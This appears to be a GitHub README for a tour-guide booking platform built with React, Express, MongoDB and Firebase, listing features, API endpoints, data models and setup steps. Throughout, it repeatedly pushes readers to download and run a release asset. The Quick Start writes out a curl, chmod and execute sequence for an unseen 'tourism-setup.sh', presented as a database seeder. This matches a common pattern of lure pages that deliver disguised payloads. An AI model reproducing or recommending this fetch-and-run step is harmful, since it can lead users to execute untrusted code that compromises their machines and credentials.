[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/IYEDZA/Tourism-Tour-Guide-Booking-Platform/releases)
https://github.com/IYEDZA/Tourism-Tour-Guide-Booking-Platform/releases

# Tourism Tour Guide Booking Platform — Book Tours & Guides

![Hero travel image](https://images.unsplash.com/photo-1507525428034-b723cf961d3e?ixlib=rb-4.0.3&q=80&w=1600&auto=format&fit=crop&sat=-100)

## 📌 Project Overview

This is a full-stack Tourist Booking Platform. The app helps users discover, select, and book tour packages. Users search tours, view guide profiles, and complete secure bookings. The platform handles user auth, bookings, payments hooks, and real-time updates for availability and chat between user and guide. The UI uses React and Tailwind-based components. The backend uses Node, Express, and MongoDB. Firebase handles real-time messaging and auth flows where required.

Download and run the release asset from the Releases page:
https://github.com/IYEDZA/Tourism-Tour-Guide-Booking-Platform/releases

Badges
- ![React](https://img.shields.io/badge/React-17.0.2-blue?logo=react)
- ![Node.js](https://img.shields.io/badge/Node.js-16-green?logo=node.js)
- ![Express](https://img.shields.io/badge/Express-4.x-lightgrey)
- ![MongoDB](https://img.shields.io/badge/MongoDB-Atlas-green)
- ![Firebase](https://img.shields.io/badge/Firebase-auth-yellow?logo=firebase)
- Topics: dasiyui, expressjs, farmer-motion, firebase, firebase-auth, mongodb, nodejs, react, react-hooks, react-router, reactjs, tawilwindcss

---

## Key Features

- Browse tours by location, duration, price, and tags. 🗺️
- View guide profiles, rating, languages, and reviews. 👨‍💼
- Select guide time slots and reserve tours. 📅
- Secure booking flow with confirmation emails. ✉️
- Authentication with email/password and Firebase social logins. 🔐
- Real-time chat between user and guide via Firebase. 💬
- Availability and booking status updated in real time. ⚡
- Admin dashboard for managing tours, guides, and bookings. 🛠️
- Responsive UI with Tailwind + daisyUI components. 📱

---

## Tech Stack

- Frontend: React, React Router, React Hooks, Tailwind CSS, daisyUI, framer-motion
- Backend: Node.js, Express
- Database: MongoDB (Atlas)
- Auth & Real-time: Firebase Auth, Firebase Realtime Database / Firestore
- Other: Mongoose, Axios, JWT (for server sessions), Socket fallback via Firebase
- Dev tooling: ESLint, Prettier, Husky, npm / pnpm

---

## Architecture (high level)

- Client (React)
  - Routes: /, /tours, /tours/:id, /guides, /profile, /bookings
  - State: local hooks + context for auth and cart
  - Real-time: Firebase listeners for chat and availability
- API (Express)
  - REST endpoints for tours, guides, bookings, payments
  - Auth middleware verifies JWT from client tokens or Firebase token
  - Webhooks for payment provider
- Data
  - MongoDB stores tours, guides, bookings, users, reviews
  - Firebase stores chat messages and presence data

Diagram (simple)
- Client <-> API <-> MongoDB
- Client <-> Firebase (Auth, Realtime)
- API <-> Payment Provider (webhooks)

---

## Screenshots

Gallery:
- Tour list: https://images.unsplash.com/photo-1500530855697-b586d89ba3ee
- Guide profile: https://images.unsplash.com/photo-1544005313-94ddf0286df2
- Booking flow: https://images.unsplash.com/photo-1493558103817-58b2924bce98

---

## Quick Start — Local Development

1. Clone repo
   - git clone https://github.com/IYEDZA/Tourism-Tour-Guide-Booking-Platform.git
   - cd Tourism-Tour-Guide-Booking-Platform

2. Install dependencies
   - Backend: cd server && npm install
   - Frontend: cd client && npm install

3. Environment variables
   - Create .env in server and client.

   Example server .env
   - PORT=5000
   - MONGO_URI=mongodb+srv://<user>:<pass>@cluster0.mongodb.net/tourism?retryWrites=true&w=majority
   - JWT_SECRET=your_jwt_secret
   - FIREBASE_PROJECT_ID=your-firebase-project-id
   - FIREBASE_CLIENT_EMAIL=firebase-client-email
   - FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"

   Example client .env
   - REACT_APP_API_URL=http://localhost:5000/api
   - REACT_APP_FIREBASE_API_KEY=your_api_key
   - REACT_APP_FIREBASE_AUTH_DOMAIN=your-auth-domain
   - REACT_APP_FIREBASE_PROJECT_ID=your_project_id

4. Seed database
   - The Releases page contains a setup script or packaged seed. Download the release asset (for example tourism-setup.sh) and run it to seed sample data and create test accounts.
   - Example:
     - curl -L -o tourism-setup.sh "https://github.com/IYEDZA/Tourism-Tour-Guide-Booking-Platform/releases/download/v1.0.0/tourism-setup.sh"
     - chmod +x tourism-setup.sh
     - ./tourism-setup.sh

5. Start servers
   - Start backend: cd server && npm run dev
   - Start frontend: cd client && npm start

6. Visit
   - Open http://localhost:3000

---

## Releases and Download

Click the Releases button to download packaged builds and setup scripts.

[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue?logo=github)](https://github.com/IYEDZA/Tourism-Tour-Guide-Booking-Platform/releases)

The releases page hosts versioned assets. Download the setup script or binary that matches your OS. Execute the downloaded script to seed data and run a basic local setup as shown above.

---

## API Reference (selected endpoints)

Base: /api

- GET /api/tours
  - Query: ?q=&location=&minPrice=&maxPrice=&tags=
  - Returns list of tours with availability

- GET /api/tours/:id
  - Returns tour detail and recommended guides

- POST /api/bookings
  - Body: { tourId, userId, guideId, startDate, guests }
  - Requires auth. Creates booking, reserves slot.

- GET /api/bookings/:id
  - Returns booking status

- POST /api/guides/:id/review
  - Body: { rating, text }
  - Adds review for guide

- POST /api/auth/signup
  - Body: { name, email, password }
  - Creates user and returns JWT

- POST /api/auth/login
  - Body: { email, password }
  - Returns JWT token

- POST /api/webhook/payment
  - Payment provider webhook for booking status updates

Example curl
- curl -X POST http://localhost:5000/api/bookings -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d '{"tourId":"abc123","guideId":"gid123","startDate":"2025-09-01","guests":2}'

---

## Data Models (summary)

- User
  - _id, name, email, passwordHash, role, avatar, createdAt
- Tour
  - _id, title, description, location, price, duration, tags, images, guideIds
- Guide
  - _id, name, languages, bio, rating, availabilities, pricePerHour
- Booking
  - _id, userId, tourId, guideId, startDate, guests, status (pending/confirmed/cancelled), paymentInfo
- Review
  - _id, userId, guideId, rating, text, createdAt

---

## Authentication & Security

- JWT secures API routes.
- The client can use Firebase Auth for social logins and then exchange Firebase token for a server JWT.
- Server validates user roles for admin routes.
- Passwords store as bcrypt hash.
- Use HTTPS in production and enable CORS origin restrictions.

---

## Real-time & Chat

- Chat uses Firebase Realtime Database or Firestore for messages.
- Presence uses Firebase presence APIs to track online guides.
- Booking availability updates push to clients via Firebase listeners.

---

## UI Components & Patterns

- Layout: Header, main, footer. Responsive nav and drawer for mobile.
- Components:
  - TourCard, TourList, TourFilter, GuideCard
  - BookingForm, AvailabilityCalendar
  - ChatPanel, Notifications
  - Admin: TourManager, GuideManager, BookingDashboard
- Styling: Tailwind CSS utility classes, daisyUI for cards, modals, and forms.
- Motion: framer-motion for subtle animations on list changes.

---

## Testing

- Backend: Jest + Supertest for API tests. Mock MongoDB with in-memory server.
- Frontend: React Testing Library for component tests. Snapshot tests for key UI.
- Run tests:
  - server: cd server && npm test
  - client: cd client && npm test

---

## Deployment

- Backend: Containerize with Docker. Push image to registry. Deploy to cloud instances or platforms that support Node.
- Frontend: Build static bundle (npm run build) and host on Vercel, Netlify, or any static host.
- Database: Use MongoDB Atlas with IP whitelist or VPC peering.
- Environment: Store secrets in platform vault or env configs.
- Use CI to run lint, tests, and build then publish to Releases for packaged artifacts.

Docker example (simple)
- docker build -t tourism-api ./server
- docker run -e MONGO_URI="..." -p 5000:5000 tourism-api

---

## Contributing

- Fork the repo and create a feature branch.
- Follow the coding style in eslint config.
- Run tests locally and include unit tests for new endpoints.
- Open a pull request with a clear description and linked issue.

---

## License

MIT License. See LICENSE file.

---

## Changelog & Releases

All packaged builds, scripts, and installers live on the Releases page. Download release artifacts and run the included setup script to seed demo data and perform initial setup.

Releases: https://github.com/IYEDZA/Tourism-Tour-Guide-Booking-Platform/releases

Contact
- Issues: Open an issue on GitHub.
- PRs: Submit via pull request.